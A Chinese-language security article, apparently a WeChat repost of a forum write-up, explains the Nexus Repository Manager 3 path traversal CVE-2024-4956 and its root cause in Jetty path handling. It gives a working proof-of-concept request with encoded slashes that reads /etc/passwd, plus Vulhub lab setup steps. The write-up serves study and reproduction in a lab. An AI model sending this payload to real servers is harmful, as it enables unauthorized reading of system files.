<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/do8uuumrTkH03DiiDocl4w)

扫码领资料

获网安教程

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSFbaUgVwdsriauB77CgQS8lyBNAxtx9IMqJQdhuuoITunu8A5Gp7kFjF7BvEXSaLMuDTYhnu7Nicghg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

![](https://mmbiz.qpic.cn/mmbiz_png/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fchVnBLMw4kTQ7B9oUy0RGfiacu34QEZgDpfia0sVmWrHcDZCV1Na5wDQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)

  

```
文章来源: https://forum.butian.net/share/3060

```

Nexus Repository Manager 3 是一款软件仓库，可以用来存储和分发 Maven、NuGET 等软件源仓库。其 3.68.0 及之前版本中，存在一处目录穿越漏洞。攻击者可以利用该漏洞读取服务器上任意文件。

说一下 Nexus 的目录穿越漏洞 CVE-2024-4956。看到这个漏洞，我其实先想到 @Orange 当时发现的 SpringMVC CVE-2018-1271。

CVE-2018-1271 漏洞中，cleanPath() 函数在处理路径的时候将空的字符串也认为是一个目录，这样 ///../../../ 会被认为是正常的路径，但实际上会穿越出当前目录：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGibibkDg1fvz1YP9LYvYbErYBWYOJW55qD2lwiaq8MiclB3LKQLwkmLkhnc0UDr6VV75iayRzbRs0o5jA/640?wx_fmt=png&from=appmsg)

与 CVE-2018-1271 类似，Nexus 使用的 Jetty 的`URIUtil.canonicalPath()`函数也将空字符串认为是一个合法目录，导致了该漏洞的产生。

最后的 POC 如下：

```
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd


```

我这里用了 7 个 %2F，所以后面可以有 7 次..%2F，成功读取到文件：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGibibkDg1fvz1YP9LYvYbErY7gtWfYAhfRnSHlJicNCXjQLcbZEt3y9UsRJZO1hrUgKHF50t1fmLFMQ/640?wx_fmt=png&from=appmsg)

我这个 POC 和网上流传的 POC 不太一样，但我觉得我这个 POC 会让你更好理解这个漏洞的核心原理。

漏洞环境
----

下载 Vulhub 中对应漏洞的环境：https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2024-4956

执行如下命令启动一个 Nexus Repository Manager version 3.68.0 版本服务器：

```
docker compose up -d


```

环境启动后，访问`http://your-ip:8081`即可看到 Nexus 的默认页面。

发送如下请求来复现漏洞：

```
GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: localhost:8081
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36
Connection: close
Cache-Control: max-age=0

```

声明：**⽂**中所涉及的技术、思路和⼯具仅供以安全为⽬的的学习交流使⽤，任何⼈不得将其⽤于⾮法⽤途以及盈利等⽬的，否则后果⾃⾏承担。**所有渗透都需获取授权**！  

**如果你是一个网络安全爱好者，欢迎加入我的知识星球：zk 安全知识星球, 我们一起进步一起学习。星球不定期会分享一些前言漏洞，每周安全面试经验、SRC 实战纪实等文章分享，微信识别二维码，只需 25，即可加入，如不满意，72 小时内可在 App 内无条件自助退款。**

![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSGpTtick8dYImTUOcmaQWHRzkPIp7SwgncysYUIo0cKZAcHvXcMEBL5ZZEJCIpUP08SGOR8bnejDxQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)![](https://mmbiz.qpic.cn/sz_mmbiz_png/CBJYPapLzSE3xxjQrLXjiaAWoqibdM1AFZ0uePzzUOG049bSjeEkbft1NfIm833fQ0ibIbW5IoE2ftnWoS3YxRPLg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp)